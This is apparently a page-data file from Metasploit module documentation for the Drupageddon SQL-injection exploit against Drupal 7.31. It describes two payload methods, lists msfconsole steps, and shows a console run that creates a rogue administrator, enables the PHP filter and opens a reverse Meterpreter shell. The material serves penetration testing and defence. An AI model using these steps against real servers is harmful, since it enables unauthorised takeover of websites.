{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/drupal_drupageddon","result":{"data":{"moduleMetadataJson":{"id":"4f034c9f-ea57-5813-bd91-7f6af33462ed","name":"Drupal HTTP Parameter Key/Value SQL Injection","fullname":"exploit/multi/http/drupal_drupageddon","description":"This module exploits the Drupal HTTP Parameter Key/Value SQL Injection\n        (aka Drupageddon) in order to achieve a remote shell on the vulnerable\n        instance. This module was tested against Drupal 7.0 and 7.31 (was fixed\n        in 7.32).\n\n        Two methods are available to trigger the PHP payload on the target:\n\n        - set TARGET 0:\n          Form-cache PHP injection method (default).\n          This uses the SQLi to upload a malicious form to Drupal's cache,\n          then trigger the cache entry to execute the payload using a POP chain.\n\n        - set TARGET 1:\n          User-post injection method.\n          This creates a new Drupal user, adds it to the administrators group,\n          enable Drupal's PHP module, grant the administrators the right to\n          bundle PHP code in their post, create a new post containing the\n          payload and preview it to trigger the payload execution.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/drupal_drupageddon","documentationSlug":"/modules/documentation/exploit/multi/http/drupal_drupageddon","referencesSlug":"/modules/references/exploit/multi/http/drupal_drupageddon"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Drupal 7.31 official <a href=\"https://ftp.drupal.org/files/projects/drupal-7.31.tar.gz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">download</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/drupal_drupageddon</code></li>\n<li>Do: <code class=\"language-text\">set rhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  This is a run against a Drupal 7.31 linux box.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/drupal_drupageddon\nmsf exploit(drupal_drupageddon)\nmsf exploit(drupal_drupageddon) &gt; set rhost 1.1.1.1\nrhost =&gt; 1.1.1.1\nmsf exploit(drupal_drupageddon) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(drupal_drupageddon) &gt; exploit\n\n[*] Started reverse TCP handler on 2.2.2.2:4444\n[*] Testing page\n[*] form_build_id: form-a1VaaaEaa0lUvL79wIAfdQEaaJRw8P7a1aWGXElI_Go\n[*] form_token:\n[*] password hash: $P\\$8zAAApjTciVA2qz7HdAA0UjAAwUft00\n[*] Creating new user AaCaUlLaPR:AAgeAAAAjA\n[*] Logging in as AaCaUlLaPR:AAgeAAAAjA\n[*] cookie: SESS911797186fac11111d08b1111a15db55=aaSfinhC0AAAAbzhAoO3bBaaOerRrvpn3cL0rA77Dhg;\n[*] Trying to parse enabled modules\n[*] form_build_id: form-YZljDkG8n5AAaAaAaaaYGLaP8MIfdif5VfwjQMMxdN0\n[*] form_token: Bj92oAaAaWRwqyAAAySWQpeUI03aA9wfkAozXsk_t_E\n[*] Enabling the PHP filter module\n[*] Setting permissions for PHP filter module\n[*] form_build_id: form-1Z1pAg11amM-1jHALgm1AAAAA1JdwAAA1qXnSTZahPA\n[*] form_token: kAA1A1AfqK_PvJQi1AAAAAAAAxyGyLvHemBor1q11Z1\n[*] admin role id: 3\n[*] Getting tokens from create new article page\n[*] form_build_id: form-_-leQaaaAAeBXbAaAAaaAAx1IrYSI1qeA2OGf2Ce1vs\n[*] form_token: Ib1y8aAaaAAAdapA53kUcfWf7msTRHiDUb_CIKzAAAA\n[*] Calling preview page. Exploit should trigger...\n[*] Sending stage (33721 bytes) to 1.1.1.1\n[*] Meterpreter session 1 opened (2.2.2.2:4444 -&gt; 1.1.1.1:45388) at 2016-08-25 11:30:41 -0400\n\nmeterpreter &gt; sysinfo\nComputer : drupal\nOS : Linux drupal 2.6.32-642.3.1.el6.x86_64 #1 SMP Sun Jun 26 18:16:44 EDT 2016 x86_64\nMeterpreter : php/linux\n\nmeterpreter &gt; getuid\nServer username: apache (48)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"4f034c9f-ea57-5813-bd91-7f6af33462ed"}}}